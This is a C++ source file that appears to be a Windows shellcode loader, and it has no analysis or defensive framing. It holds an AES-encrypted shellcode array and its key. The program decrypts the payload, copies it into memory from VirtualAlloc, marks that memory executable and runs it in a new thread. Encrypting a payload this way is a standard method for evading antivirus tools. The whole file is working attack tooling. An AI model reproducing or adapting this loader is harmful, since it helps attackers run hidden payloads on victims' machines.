#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <wincrypt.h>
#include <iostream>
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")
#include <psapi.h>


using namespace std;

int AESDecrypt(char* payload, unsigned int payload_length, char* key, size_t keylen) {
	HCRYPTPROV hProv;
	HCRYPTHASH hHash;
	HCRYPTKEY hKey;

	if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
		return -1;
	}
	if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
		return -1;
	}
	if (!CryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0)) {
		return -1;
	}
	if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)) {
		return -1;
	}

	if (!CryptDecrypt(hKey, (HCRYPTHASH)NULL, 0, 0, (BYTE *)payload, (DWORD *)&payload_length)) {
		return -1;
	}

	CryptReleaseContext(hProv, 0);
	CryptDestroyHash(hHash);
	CryptDestroyKey(hKey);

	return 0;
}

using namespace std;

int main() {





	/*
	* ///ShellXORER.py in 2.7
		1-	Edit File Path
		2-	run
		*/
	char key[] = { 0xf4, 0x4e, 0x24, 0xf7, 0xb0, 0xc, 0x76, 0x1b, 0x88, 0xb1, 0xe9, 0x76, 0xef, 0x52, 0x40, 0x45 };

	unsigned char ShellCode[] = {0x75, 0xe1, 0xd0, 0x47, 0xf5, 0x2f, 0x26, 0xbc, 0x8a, 0x7e, 0xec, 0x5d, 0xd1, 0x59, 0xcc, 0xa1, 0x43, 0x36, 0x9c, 0xb8, 0xb3, 0xbc, 0x76, 0x6d, 0x19, 0x4d, 0xf9, 0x8a, 0x2, 0xdd, 0x3e, 0xf, 0x92, 0x91, 0xe9, 0x6e, 0x9f, 0xfa, 0x37, 0xaf, 0xaf, 0xfa, 0xfd, 0x3b, 0xb, 0xcc, 0xeb, 0xb, 0x56, 0x99, 0xd5, 0x1c, 0x33, 0x73, 0x1e, 0x2a, 0x2c, 0x6a, 0x7b, 0xe7, 0xd5, 0xf8, 0x5b, 0xa8, 0xdc, 0xa0, 0x96, 0xda, 0x61, 0x74, 0x0, 0x4a, 0x27, 0x28, 0x27, 0x99, 0x16, 0xba, 0x7f, 0xae, 0x8a, 0x23, 0x72, 0xbd, 0x23, 0x87, 0x6f, 0x43, 0x12, 0x29, 0xad, 0xe1, 0xf8, 0x1, 0x1f, 0x1c, 0xea, 0xfd, 0xa5, 0x93, 0xea, 0x9, 0x15, 0x7, 0x95, 0x66, 0x17, 0x68, 0xc8, 0xd6, 0xd8, 0xe8, 0xd3, 0x28, 0x10, 0x55, 0x44, 0xff, 0x91, 0x91, 0x4e, 0x3, 0x52, 0x5e, 0x21, 0x79, 0x7d, 0x16, 0xaf, 0x1f, 0x0, 0x38, 0x84, 0x77, 0xc2, 0x6d, 0x65, 0x25, 0x20, 0x21, 0x49, 0x76, 0xd2, 0x14, 0xd0, 0x45, 0x4e, 0x62, 0xd3, 0x77, 0xc8, 0xa3, 0xc4, 0xb5, 0x46, 0x3c, 0xbb, 0xf0, 0x71, 0xb9, 0x8a, 0xd3, 0x59, 0xd0, 0x5a, 0x15, 0xb, 0xbe, 0xf5, 0x9c, 0x7a, 0xe5, 0xea, 0x6a, 0x3, 0x24, 0x32, 0x9b, 0x6f, 0xf5, 0x5a, 0x8f, 0x18, 0xb6, 0x34, 0xd, 0xff, 0xbf, 0xd9, 0x3c, 0xbb, 0xf5, 0x2d, 0x35, 0x71, 0x68, 0x10, 0xe4, 0x4e, 0xd8, 0x72, 0x47, 0x19, 0xa4, 0x5e, 0x9a, 0xcc, 0xc2, 0xf7, 0xaa, 0x72, 0x5e, 0xe, 0xf1, 0x5e, 0xea, 0x70, 0xfc, 0xa4, 0xff, 0x79, 0x43, 0xf1, 0xe0, 0x6, 0x43, 0x62, 0xcd, 0xbc, 0xde, 0x80, 0xff, 0xe9, 0x6b, 0xc1, 0x3d, 0xda, 0x7f, 0xd7, 0x8a, 0x9, 0x1d, 0x41, 0xeb, 0xf5, 0xcf, 0xb, 0x8c, 0x98, 0x56, 0xf, 0x19, 0x58, 0xe7, 0x57, 0xfb, 0x27, 0x9c, 0x44, 0x32, 0xdb, 0x80, 0x7b, 0x2d, 0xb, 0xa1, 0x3e, 0x1, 0x14, 0x4, 0x27, 0x9, 0x67, 0xa, 0xf4, 0x22, 0x75, 0x2c, 0x71, 0xbf, 0x10, 0x3a, 0x26, 0xc1, 0x6f, 0x1, 0x55, 0x6d };
	
	unsigned int payload_len = sizeof(ShellCode);

	DWORD oldprotect = 0;


// Allocate a memory buffer for payload
//#define MEM_COMMIT                      0x00001000  
//#define MEM_RESERVE                     0x00002000  
//#define PAGE_READWRITE			      0x04   
//#define PAGE_EXECUTE_READ				  0x20    


	//void* exec_mem = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	void* exec_mem = VirtualAlloc(0, payload_len, 0x1000 | 0x2000, 0x04);
	printf("%-20s : 0x%-016p\n", "payload addr", (void*)ShellCode);
	printf("%-20s : 0x%-016p\n", "exec_mem addr", (void*)exec_mem);
	// Decrypt (DeXOR) the payload
	std::cout << "\n[+][+] Decrypting Shell Code [+][+]\n";
	AESDecrypt((char*)ShellCode, payload_len, key, sizeof(key));

	// Copy payload to new buffer
	RtlMoveMemory(exec_mem, ShellCode, payload_len);
	printf("Payload Moved To memory");
	// Make new buffer as executable

	BOOL rv = VirtualProtect(exec_mem, payload_len, 0x20, &oldprotect);
	if (rv) {
		printf("\nShellCode Injected Succefully!\n");
	}


	HANDLE th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)exec_mem, 0, 0, 0);
	WaitForSingleObject(th, -1);
	getchar();

	return 0;
}
